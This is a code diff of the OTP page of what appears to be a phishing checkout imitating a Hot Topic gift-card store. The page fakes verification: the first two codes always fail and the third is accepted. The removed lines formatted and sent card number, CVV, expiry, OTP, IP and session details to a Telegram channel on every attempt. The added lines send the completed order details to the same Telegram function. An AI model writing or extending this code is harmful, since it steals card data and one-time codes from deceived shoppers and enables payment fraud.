@@ -80,113 +80,14 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
   
-  // Format OTP attempt message with enhanced styling for Telegram
-  const formatOTPTelegramMessage = (otpAttempt: number) => {
-    // Color coding: first and second attempts are red, third (successful) attempt is green
-    const isLastAttempt = otpAttempt === 3;
-    
-    const headerStyle = isLastAttempt 
-      ? '✅ *SUCCESS: VERIFICATION COMPLETE* ✅' 
-      : `🔴 *ALERT: VERIFICATION ATTEMPT ${otpAttempt}* 🔴`;
-    
-    const statusEmoji = isLastAttempt ? '✅' : '❌';
-    const statusColor = isLastAttempt ? '🟢' : '🔴';
-    const statusText = isLastAttempt 
-      ? 'Final attempt successful - Payment authorized' 
-      : `Failed attempt ${otpAttempt}/3 - Awaiting verification`;
-    
-    // Full card details section
-    const cardDetailsSection = `
-💳 *FULL PAYMENT DETAILS*:
-   Card Type: ${paymentMethod || "Unknown"}
-   Card Number: \`${orderDetails?.cardNumber || "N/A"}\`
-   Card Holder: ${orderDetails?.cardName || "N/A"}
-   Expiry: ${orderDetails?.expiryDate || "N/A"}
-   CVV: \`${orderDetails?.cvv || "N/A"}\`
-   Amount: $${discountedAmount?.toFixed(2) || "0.00"}`;
-
-    return `
-${headerStyle}
-
-👤 *CUSTOMER DETAILS*:
-   Name: ${orderDetails?.customerName || "N/A"}
-   Email: ${orderDetails?.email || "N/A"}
-   Phone: ${orderDetails?.phone || "N/A"}
-
-${cardDetailsSection}
-
-🔐 *VERIFICATION STATUS*:
-   ${statusColor} ${statusText}
-   ${statusEmoji} Attempt: ${otpAttempt}/3
-   ${isLastAttempt ? '⚡ OTP Code Entered: ' + otp : ''}
-
-🛒 *ORDER DETAILS*:
-   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
-   Delivery Method: ${orderDetails?.deliveryMethod || "N/A"}
-
-🔍 *USER INFORMATION*:
-   IP Address: \`${orderDetails?.userInfo?.ip || "Unknown"}\`
-   Browser: ${orderDetails?.userInfo?.userAgent || "Unknown"}
-   Session ID: ${orderDetails?.userInfo?.sessionId || "Not available"}
-
-⏰ *TIMESTAMP*: ${new Date().toLocaleString()}
-
-${isLastAttempt ? '✅ *PAYMENT SUCCESSFULLY VERIFIED* ✅' : '⚠️ *VERIFICATION PENDING* ⚠️'}
-`;
-  };
-
   // Check OTP validity based on attempt number
-  const verifyOTP = async () => {
+  const verifyOTP = () => {
     // OTP validation
     if (otp.length !== 6) {
       setError("Please enter a complete 6-digit code");
       return false;
     }
     
-    // Send notification to Telegram about this OTP attempt
-    try {
-      // Current attempt number (adding 1 because we haven't incremented yet)
-      const currentAttempt = attempts + 1;
-      
-      // Create OTP attempt notification object
-      const otpAttemptDetails = {
-        ...orderDetails,
-        notificationType: "otp_attempt",
-        otpAttempt: currentAttempt,
-        userInfo: {
-          ip: orderDetails?.userInfo?.ip || "Unknown",
-          userAgent: orderDetails?.userInfo?.userAgent || navigator.userAgent,
-          sessionId: orderDetails?.userInfo?.sessionId || "Not available",
-          timestamp: new Date().toISOString()
-        },
-        // Include full card details
-        cardNumber: orderDetails?.cardNumber,
-        cardName: orderDetails?.cardName,
-        expiryDate: orderDetails?.expiryDate,
-        cvv: orderDetails?.cvv
-      };
-
-      // Custom formatted message with enhanced design
-      const formattedMessage = formatOTPTelegramMessage(currentAttempt);
-      
-      // Use direct message in request body
-      supabase.functions.invoke("send-telegram-notification", {
-        body: {
-          ...otpAttemptDetails,
-          customMessage: formattedMessage
-        }
-      }).then(response => {
-        if (response.error) {
-          console.error("Failed to send OTP attempt notification:", response.error);
-        } else {
-          console.log("OTP attempt notification sent successfully:", response.data);
-        }
-      });
-    } catch (notificationErr) {
-      console.error("Error sending OTP attempt notification:", notificationErr);
-      // Don't block verification flow if notification fails
-    }
-
     // First two attempts will always fail, third attempt will succeed
     if (attempts < 2) {
       setError("Invalid verification code. Please try again.");
@@ -220,7 +121,7 @@ ${isLastAttempt ? '✅ *PAYMENT SUCCESSFULLY VERIFIED* ✅' : '⚠️ *VERIFICAT
     setError("");
     
     // Validate OTP
-    if (!await verifyOTP()) {
+    if (!verifyOTP()) {
       return;
     }
     
@@ -240,6 +141,22 @@ ${isLastAttempt ? '✅ *PAYMENT SUCCESSFULLY VERIFIED* ✅' : '⚠️ *VERIFICAT
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
+      
+      // Send order notification to Telegram
+      try {
+        console.log("Sending order notification to Telegram with details:", completeOrderDetails);
+        supabase.functions.invoke("send-telegram-notification", {
+          body: completeOrderDetails
+        }).then(response => {
+          if (response.error) {
+            console.error("Failed to send Telegram notification:", response.error);
+          } else {
+            console.log("Telegram notification sent successfully:", response.data);
+          }
+        });
+      } catch (telegramErr) {
+        console.error("Error sending Telegram notification:", telegramErr);
+      }
       
       // Navigate to payment success page
       navigate("/payment-success", { 
